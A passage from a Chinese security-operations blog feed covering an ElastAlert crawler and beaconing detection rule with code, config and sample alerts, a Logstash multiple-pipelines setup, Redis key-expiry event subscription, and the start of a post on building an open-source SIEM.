class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_spiders</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.df.empty:</span><br><span class="line">            <span class="keyword">raise</span> Exception(</span><br><span class="line">                <span class="string">&quot;Elasticsearch did not retrieve any data. Please ensure your settings are correct inside the config file.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        tqdm.pandas(desc=<span class="string">&quot;Detection of Spider Crawlers.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get url_path</span></span><br><span class="line">        self.df[self.url_path] = self.df[self.url].<span class="built_in">str</span>.split(<span class="string">&#x27;?&#x27;</span>).<span class="built_in">str</span>.get(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add session_id from hash fields</span></span><br><span class="line">        self.df[<span class="string">&#x27;session_id&#x27;</span>] = self.df[self.fields[<span class="string">&#x27;hash&#x27;</span>]</span><br><span class="line">                                        ].progress_apply(<span class="keyword">lambda</span> row: <span class="built_in">hash</span>(<span class="built_in">tuple</span>(row)), axis=<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># split url</span></span><br><span class="line">        self.df = self.df[self.df[self.url].apply(<span class="keyword">lambda</span> request: <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">len</span>(</span><br><span class="line">            request.split(<span class="string">&#x27;?&#x27;</span>)) == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span>)].reset_index(drop=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># normalized url</span></span><br><span class="line">        self.df[self.url] = self.df[self.url].apply(</span><br><span class="line">            <span class="keyword">lambda</span> request: html.unescape(request))</span><br><span class="line">        <span class="comment"># unique session_id</span></span><br><span class="line">        unique_session = self.df[<span class="string">&#x27;session_id&#x27;</span>].unique()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> session <span class="keyword">in</span> unique_session:</span><br><span class="line">            self.q_job.put(session)</span><br><span class="line"></span><br><span class="line">        mgr = Manager()</span><br><span class="line">        spider_list = mgr.<span class="built_in">list</span>()</span><br><span class="line">        processes = [Process(target=self.find_spider, args=(</span><br><span class="line">            self.q_job, spider_list,)) <span class="keyword">for</span> thread <span class="keyword">in</span> <span class="built_in">range</span>(self.NUM_PROCESSES)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Run processes</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.start()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Exit the completed processes</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.join()</span><br><span class="line"></span><br><span class="line">        results = pd.DataFrame(<span class="built_in">list</span>(spider_list))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add timestamp</span></span><br><span class="line">        now = datetime.datetime.now().isoformat()</span><br><span class="line">        results[<span class="string">&#x27;timestamp&#x27;</span>] = now</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> results.empty:</span><br><span class="line">            results = results[results[<span class="string">&#x27;alert&#x27;</span>] == <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line">        match_log = <span class="string">&quot;Queried rule %s matches %s crawl events&quot;</span> % (</span><br><span class="line">            self.rules[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            results.shape[<span class="number">0</span>]</span><br><span class="line">        )</span><br><span class="line">        elastalert_logger.info(match_log)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><ul>
<li><h6 id="Web-yaml"><a href="#Web-yaml" class="headerlink" title="Web.yaml"></a>Web.yaml</h6></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">&quot;Detection of Spider Crawlers&quot;</span></span><br><span class="line"><span class="attr">es_host:</span> <span class="string">&quot;es_server&quot;</span></span><br><span class="line"><span class="attr">es_port:</span> <span class="number">9200</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;elastalert_modules.spider.my_rules.SpiderRule&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">index:</span> <span class="string">&quot;zeek-other-%Y.%m.%d&quot;</span></span><br><span class="line"><span class="attr">use_strftime_index:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">filter:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">term:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">&quot;canon88.github.io&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">term:</span></span><br><span class="line">    <span class="attr">method.keyword:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">include:</span> [<span class="string">&quot;true_client_ip&quot;</span>, <span class="string">&quot;host&quot;</span>, <span class="string">&quot;uri&quot;</span>, <span class="string">&quot;uri_path&quot;</span>, <span class="string">&quot;user_agent&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">timestamp:</span></span><br><span class="line">  <span class="attr">format:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">timestamp_field:</span> <span class="string">&quot;@timestamp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">buffer_time:</span></span><br><span class="line">  <span class="attr">hours:</span> <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="attr">run_every:</span></span><br><span class="line">  <span class="attr">minutes:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">max_query_size:</span> <span class="number">10000</span></span><br><span class="line"><span class="attr">scroll:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">beacon:</span></span><br><span class="line">  <span class="attr">max_args_length:</span> <span class="number">10</span>		<span class="comment"># 最大检测参数个数</span></span><br><span class="line">  <span class="attr">min_hits:</span> <span class="number">120</span>					<span class="comment"># 最小命中事件数</span></span><br><span class="line">  <span class="attr">max_unique_args:</span> <span class="number">2</span>		<span class="comment"># 最大动态变化参数</span></span><br><span class="line">  <span class="attr">threshold_percent:</span> <span class="number">70</span>	<span class="comment"># 请求阈值百分比</span></span><br><span class="line">  <span class="attr">threads:</span> <span class="number">16</span>						<span class="comment"># 多进程</span></span><br><span class="line">  <span class="attr">beacon_module:</span> <span class="literal">true</span>		<span class="comment"># 开启周期性检测</span></span><br><span class="line">  <span class="attr">min_interval:</span> <span class="number">1</span>				<span class="comment"># 最小周期</span></span><br><span class="line">  <span class="attr">window:</span> <span class="number">2</span>							<span class="comment"># 抖动窗口</span></span><br><span class="line">  <span class="attr">user_agent:</span> <span class="number">20</span>				<span class="comment"># 唯一UA个数</span></span><br><span class="line"></span><br><span class="line"><span class="attr">field:</span></span><br><span class="line">  <span class="attr">true_client_ip:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">src_ip</span></span><br><span class="line">    <span class="attr">type:</span> [<span class="string">hash</span>]</span><br><span class="line">  <span class="attr">host:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">http_host</span></span><br><span class="line">    <span class="attr">type:</span> [<span class="string">hash</span>]</span><br><span class="line">  <span class="attr">uri_path:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">url_path</span></span><br><span class="line">    <span class="attr">type:</span> [<span class="string">hash</span>]</span><br><span class="line">  <span class="attr">uri:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">url</span></span><br><span class="line">  <span class="attr">user_agent:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">user_agent</span></span><br><span class="line"></span><br><span class="line"><span class="attr">output:</span></span><br><span class="line">  <span class="attr">json:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">yes</span>	<span class="comment"># 本地输出</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/var/log/spider/spider_detect.json</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">no</span>	<span class="comment"># 输出至Redis，联动情报数据进行研判。</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">redis_server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">db:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">redis_password</span></span><br><span class="line">    <span class="attr">key:</span> <span class="string">spider:feeds</span></span><br><span class="line">    <span class="attr">field:</span> <span class="string">src_ip</span></span><br><span class="line"></span><br><span class="line"><span class="attr">alert:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">debug</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="告警输出"><a href="#告警输出" class="headerlink" title="告警输出"></a>告警输出</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;detail&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;percent&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;cookieid&quot;</span>: <span class="number">81</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;unique&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;cookieid&quot;</span>: <span class="number">133</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;enumerate&quot;</span>, <span class="comment">// 存在参数遍历行为</span></span><br><span class="line">    <span class="string">&quot;suspicious-ua&quot;</span>	<span class="comment">// user_agent 超过阈值</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;54.160.169.250&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url_path&quot;</span>: <span class="string">&quot;/image/cookieId.html&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;http_host&quot;</span>: <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;unique_ua&quot;</span>: <span class="number">47</span>,</span><br><span class="line">  <span class="attr">&quot;alert&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;beacon&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">&quot;args_list&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;cookieid&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;total_hits&quot;</span>: <span class="number">164</span>,</span><br><span class="line">  <span class="attr">&quot;url_sample&quot;</span>: <span class="string">&quot;/image/cookieId.html?cookieid=E99A3E54-5A81-2907-1372-339FFB70A464&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;period&quot;</span>: <span class="string">&quot;1:00&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2020-06-02T11:07:59.276581&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h5><p><strong>find_spider： <strong>用于检测参数遍历的行为，这里加上</strong>find_beacon</strong>是为了增加一个周期性的检测维度。当然很多爬虫都会「自带」时间抖动，以及使用爬虫池，所以效果并不是特别明显。</p>
<p><strong>find_beacon：</strong>更适用于检测C2连接，例如针对DNS域名的请求这种情况，这里有一个检测到的域名周期性请求的告警：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;x.x.x.228&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;entitlement.service.imperva.com&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;answers&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;joxkwsf.x.incapdns.net&quot;</span>,</span><br><span class="line">        <span class="string">&quot;45.60.73.51&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;percent&quot;</span>: <span class="string">&quot;100&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;interval&quot;</span>: <span class="number">1800</span>,</span><br><span class="line">    <span class="attr">&quot;occurrences&quot;</span>: <span class="number">23</span>,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2020-06-01T08:03:38.164363&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;period&quot;</span>: <span class="number">12</span>,</span><br><span class="line">    <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;beaconing&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;num_hits&quot;</span>: <span class="number">806379</span>,</span><br><span class="line">    <span class="attr">&quot;num_matches&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;kibana_url&quot;</span>: <span class="string">&quot;https://canon88.github.io/goto/5f089bcc411426b854da71b9062fdc8c&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/%E5%91%A8%E6%9C%9F%E6%80%A7DNS%E8%AF%B7%E6%B1%82%E6%88%AA%E5%9B%BE-1.png" alt="image-20200603113849810"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​        1小时内，IP: 54.160.169.250 总共访问了该接口164次且cookieid参数更换了133次，占到总请求量的81%。并更换了47个不同的user_agent。</p>
<p><img src="/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/%E5%BC%82%E5%B8%B8%E8%AE%BF%E9%97%AE%E6%88%AA%E5%9B%BE-1.png" alt="image-20200602114610615"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><strong><a href="https://github.com/austin-taylor/flare">Flare</a></strong></p>
<p><strong><a href="https://github.com/Yelp/elastalert">ElastAlert</a></strong></p>
]]></content>
      <categories>
        <category>SIEM</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>Elastalert</tag>
      </tags>
  </entry>
  <entry>
    <title>Logstash Multiple Pipelines</title>
    <url>/2019/12/30/Logstash-Multiple-Pipelines/</url>
    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>当Logstash要处理的多个input类型时, 最常见的两种解决方案(<strong>不推荐</strong>):</p>
<ol>
<li><p>通过条件判断解决问题</p>
</li>
<li><p>通过多实例解决问题</p>
</li>
</ol>
<p><strong>负面影响:</strong></p>
<ol>
<li><p>条件判断</p>
<ol>
<li>条件地狱。已知的在一个管道中实现多个独立流的方法是使用条件判断。主要方式是在输入部分通过标签标记事件，然后在过滤器中和输出阶段创建条件分支，对贴有不同标签的事件，应用不同的插件集。这种方式虽然可以解决问题，但在实际的使用中却非常的痛苦！下面是一个简单的 demo 片段：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    beats &#123; </span><br><span class="line">        port =&gt; 3444  </span><br><span class="line">        tag =&gt; apache </span><br><span class="line">    &#125;</span><br><span class="line">    tcp &#123; </span><br><span class="line">        port =&gt; 4222</span><br><span class="line">        tag =&gt; firewall</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;apache&quot;</span> <span class="keyword">in</span> [tags] &#123;</span><br><span class="line">        dissect &#123; ... &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="string">&quot;firewall&quot;</span> <span class="keyword">in</span> [tags] &#123;</span><br><span class="line">        grok &#123; ... &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;apache&quot;</span> <span class="keyword">in</span> [tags] &#123;</span><br><span class="line">        elasticsearch &#123; ... &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="string">&quot;firewall&quot;</span> <span class="keyword">in</span> [tags] &#123;</span><br><span class="line">        tcp &#123; ... &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ol>
<li>缺乏拥塞管理。Logstash在所有事件和完成所有输出之前不会移动到下一批事件。这意味着，对于上面的管道，如果 TCP 套接字目标不可达，Logstash将不会处理其他批次的事件，这也就意味着 Elasticsearch 将不会接收事件，并且会对 TCP 输入和 Beats 输入施加反压力。</li>
<li>不同的数据流需要以不同的方式处理。如果 TCP - &gt; Grok - &gt; TCP 数据流处理大量的小数据，而 Beats -&gt; Dissect -&gt; ES 数据流中的单个数据体积大但是数量少。那么前一个数据流希望有多个 worker 并行并其每一批次处理更多事件，第二个数据流则期望使用少量的 worker 和每批次处理少量的事件。使用单个管道，无法为单个数据流指定独立的管道配置。</li>
</ol>
</li>
<li><p>多实例</p>
<ol>
<li>需要管理多个实例(通过 init 系统管理多个后台服务)</li>
<li>每个 Logstash 的实例也意味着一个独立的 JVM</li>
<li>需要监视每个 Logstash 实例</li>
</ol>
</li>
</ol>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>​        通过配置多管道(Multiple Pipelines), 解决以上的所有问题。</p>
<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p><code>/usr/share/logstash/config/pipelines.yml</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This file is where you define your pipelines. You can define multiple.</span></span><br><span class="line"><span class="comment"># For more information on multiple pipelines, see the documentation:</span></span><br><span class="line"><span class="comment">#   https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html</span></span><br><span class="line"></span><br><span class="line">- pipeline.id: dsiem</span><br><span class="line">  path.config: <span class="string">&quot;/etc/logstash/conf.d_siem/*.conf&quot;</span></span><br><span class="line">  pipeline.workers: 16</span><br><span class="line">  queue.type: persisted</span><br><span class="line">  queue.max_bytes: 300gb</span><br><span class="line"></span><br><span class="line">- pipeline.id: cloudflare</span><br><span class="line">  path.config: <span class="string">&quot;/etc/logstash/conf.d_cf/*.conf&quot;</span></span><br><span class="line">  pipeline.workers: 8</span><br><span class="line">  queue.type: persisted</span><br><span class="line">  queue.max_bytes: 100gb</span><br><span class="line"></span><br><span class="line">- pipeline.id: ti</span><br><span class="line">  path.config: <span class="string">&quot;/etc/logstash/conf.d_ti/*.conf&quot;</span></span><br><span class="line">  pipeline.workers: 8</span><br><span class="line">  queue.type: persisted</span><br><span class="line">  queue.max_bytes: 50gb</span><br></pre></td></tr></table></figure>

<p><code>/etc/supervisord.d/logstash.ini</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[program:logstash]</span><br><span class="line"><span class="built_in">command</span>=/usr/share/logstash/bin/logstash --path.data /lingtian/data/logstash/</span><br><span class="line"><span class="comment">#user=logstash</span></span><br><span class="line">numprocs=1</span><br><span class="line">autostart=<span class="literal">true</span></span><br><span class="line">autorestart=<span class="literal">true</span></span><br><span class="line">startsecs=1</span><br><span class="line">startretries=3</span><br><span class="line">exitcodes=0,2</span><br><span class="line">stopsignal=INT</span><br><span class="line">redirect_stderr=<span class="literal">true</span></span><br><span class="line">stdout_logfile_maxbytes=1MB</span><br><span class="line">stdout_logfile_backups=5</span><br><span class="line">stdout_capture_maxbytes=1MB</span><br><span class="line">stdout_logfile=/lingtian/logs/logstash/logstash.log</span><br></pre></td></tr></table></figure>

<h5 id="加载配置文件"><a href="#加载配置文件" class="headerlink" title="加载配置文件"></a>加载配置文件</h5><p>可通过使用参数, <code>--config.reload.automatic</code> or <code>-r</code> 在配置文件发生更改后自动检测并重新加载配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bin/logstash -f apache.config --config.reload.automatic</span><br></pre></td></tr></table></figure>

<p>默认3秒检查配置文件, 可以通过使用参数, <code>--config.reload.interval </code>修改秒数。</p>
<p>如果Logstash已经在没有启用自动重载的情况下运行，则可以通过向运行Logstash的进程发送SIGHUP（信号挂起）来强制Logstash重载配置文件并重新启动管道。例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">kill</span> -SIGHUP <span class="variable">$logstash_pid</span></span><br></pre></td></tr></table></figure>

<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><p><strong><a href="https://github.com/elastic/logstash/blob/master/config/pipelines.yml">Pipelines 参数</a></strong></p>
</li>
<li><p><strong><a href="https://www.elastic.co/guide/en/logstash/6.7/multiple-pipelines.html">Multiple Pipelines</a></strong></p>
</li>
<li><p><strong><a href="https://www.elastic.co/cn/blog/logstash-multiple-pipelines">Introducing Multiple Pipelines in Logstash - 原文</a></strong></p>
</li>
<li><p><strong><a href="https://www.cnblogs.com/sparkdev/p/11073980.html">Introducing Multiple Pipelines in Logstash - 中文</a></strong></p>
</li>
<li><p><strong><a href="https://www.elastic.co/guide/en/logstash/current/reloading-config.html">Reloading the Config Fileedit </a></strong></p>
</li>
<li><p><a href="http://www.51niux.com/?id=205"><strong>Logstash详细记录（五</strong>）</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>ELK</category>
      </categories>
      <tags>
        <tag>Logstash</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis Key 过期事件订阅</title>
    <url>/2019/12/24/Redis-Key-%E8%BF%87%E6%9C%9F%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/</url>
    <content><![CDATA[<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>​        在自建企业内部威胁情报的过程中, 需要通过<strong>Redis</strong>统一管理过期时间的<strong>Key</strong>。因此需要对过期的<strong>Key</strong>进行实时监听, 并进行回调处理。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​        在 <strong>Redis</strong> 的 <strong>2.8.0</strong> 版本之后，其推出了一个新的特性——键空间消息（Redis Keyspace Notifications），它配合 2.0.0 版本之后的 SUBSCRIBE 就能完成这个定时任务的操作了。</p>
<p><strong>Redis 的键空间通知支持 订阅指定 Key 的所有事件 与 订阅指定事件 两种方式。</strong></p>
<blockquote>
<p>Keyspace notifications are implemented sending two distinct type of events for every operation affecting the Redis data space. For instance a DEL operation targeting the key named mykey in database 0 will trigger the delivering of two messages, exactly equivalent to the following two PUBLISH commands:</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUBLISH __keyspace@0__:mykey del</span><br><span class="line">PUBLISH __keyevent@0__:del mykey</span><br></pre></td></tr></table></figure>

<p><strong>通过 Redis 的键空间通知（keyspace notification）可以做到：将IoC数据写入Redis，设置过期时间10分钟，利用 Redis 键过期回调提醒，如果未被消费，则进行处理。</strong></p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><h4 id="1-修改-redis-conf-开启redis-key过期提醒"><a href="#1-修改-redis-conf-开启redis-key过期提醒" class="headerlink" title="1. 修改 redis.conf 开启redis key过期提醒"></a>1. 修改 redis.conf 开启redis key过期提醒</h4><blockquote>
<p>By default keyspace events notifications are disabled because while not very sensible the feature uses some CPU power. Notifications are enabled using the notify-keyspace-events of redis.conf or via the CONFIG SET.</p>
</blockquote>
<p>由于键空间通知比较耗CPU, 所以 Redis默认是关闭键空间事件通知的， 需要手动开启 <code>notify-keyspace-events </code>后才启作用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">K：keyspace事件，事件以__keyspace@&lt;db&gt;__为前缀进行发布；        </span><br><span class="line">E：keyevent事件，事件以__keyevent@&lt;db&gt;__为前缀进行发布；        </span><br><span class="line">g：一般性的，非特定类型的命令，比如del，expire，rename等；       </span><br><span class="line">$：String 特定命令；        </span><br><span class="line">l：List 特定命令；        </span><br><span class="line">s：Set 特定命令；        </span><br><span class="line">h：Hash 特定命令；        </span><br><span class="line">z：Sorted 特定命令；        </span><br><span class="line">x：过期事件，当某个键过期并删除时会产生该事件；        </span><br><span class="line">e：驱逐事件，当某个键因maxmemore策略而被删除时，产生该事件；        </span><br><span class="line">A：g<span class="variable">$lshzxe</span>的别名，因此”AKE”意味着所有事件。</span><br></pre></td></tr></table></figure>

<p><strong><code>notify-keyspace-events Ex</code> 表示开启键过期事件提醒</strong></p>
<p><strong>redis.conf</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># RDB Config</span></span><br><span class="line">databases 16</span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br><span class="line">stop-writes-on-bgsave-error yes</span><br><span class="line">rdbcompression yes</span><br><span class="line">rdbchecksum no</span><br><span class="line">dir ./</span><br><span class="line"><span class="comment"># AOF Config</span></span><br><span class="line">appendonly yes</span><br><span class="line">appendfilename <span class="string">&quot;appendonly.aof&quot;</span></span><br><span class="line">appendfsync everysec</span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line">auto-aof-rewrite-min-size 64mb</span><br><span class="line"><span class="comment"># set Password</span></span><br><span class="line">requirepass %&#123;mypassword&#125;</span><br><span class="line"><span class="comment"># set notify-keyspace-events</span></span><br><span class="line">notify-keyspace-events Ex</span><br></pre></td></tr></table></figure>

<h4 id="2-RedisHelper"><a href="#2-RedisHelper" class="headerlink" title="2. RedisHelper"></a>2. RedisHelper</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># Author: Canon</span></span><br><span class="line"><span class="comment"># Date: 2019-12-27</span></span><br><span class="line"><span class="comment"># Version: 0.2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisHelper</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 连接Redis</span></span><br><span class="line">        self.__conn = redis.Redis(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">6379</span>, password=<span class="string">&#x27;mypassword&#x27;</span>, db=<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># 定义keyevent, 此处0为indexdb</span></span><br><span class="line">        self.keyevent = <span class="string">&#x27;__keyevent@0__:expired&#x27;</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 发布方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">publish</span>(<span class="params">self, key, msg</span>):</span></span><br><span class="line">        ttl = <span class="number">10</span></span><br><span class="line">        self.__conn.setex(key, msg, ttl)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 订阅方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">subscribe</span>(<span class="params">self</span>):</span></span><br><span class="line">        sub = self.__conn.pubsub()</span><br><span class="line">        sub.subscribe(self.keyevent)</span><br><span class="line">        <span class="keyword">for</span> msg <span class="keyword">in</span> sub.listen():</span><br><span class="line">            <span class="keyword">if</span> msg[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;message&#x27;</span>:</span><br><span class="line">                ex_key = msg[<span class="string">&#x27;data&#x27;</span>].decode()</span><br><span class="line">                <span class="built_in">print</span>(ex_key)</span><br></pre></td></tr></table></figure>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><p><strong><a href="https://crazyfzw.github.io/2019/03/26/redis-keyspace-notifications/">订阅 Redis 的 key 过期事件实现动态定时任务</a></strong></p>
</li>
<li><p><strong><a href="https://segmentfault.com/a/1190000016898228">python开发-实现redis中的发布订阅功能</a></strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>致我心中的 “散装”（开源）SIEM（一）</title>
    <url>/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>​        由于工作比较忙，有段时间没有更了，快到年底了，就当是总结了。今年主要精力都是在围绕着安全运营这一块的工作，随着工作的开展发现自己<strong>“组装”</strong>的SIEM用起来不是很“<strong>舒服</strong>”。这是我之前写的一篇《<a href="https://canon88.github.io/2020/02/25/Wazuh-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%85%B3%E8%81%94%E5%91%8A%E8%AD%A6/"><strong>Wazuh-如何对异构数据进行关联告警</strong></a>》的文章，当时规划的数据流的Workflow如下图所示。</p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/image-20200303215020561.png" alt="image-20200303215020561"></p>
<p>​        <strong>“散装”SIEM</strong>主要是建立在ELK的框架之上，告警模块分别采用了Wazuh与Elastalert。早期为了使Wazuh能够消费异构数据<strong>（WAF、NTA、EDR）</strong>并进行关联告警，我在数据入库之前利用Logstash对异构数据进行了标准化，同时Wazuh对标准化后的数据进行关联。例如：Suricata通过Filebeat将告警事件发出，由Logstash统一进行标准化处理并同时输出到Elastic以及Wazuh。其中Elastic为告警的元数据，推送到Wazuh上的为标准化后的安全事件。</p>
<hr>
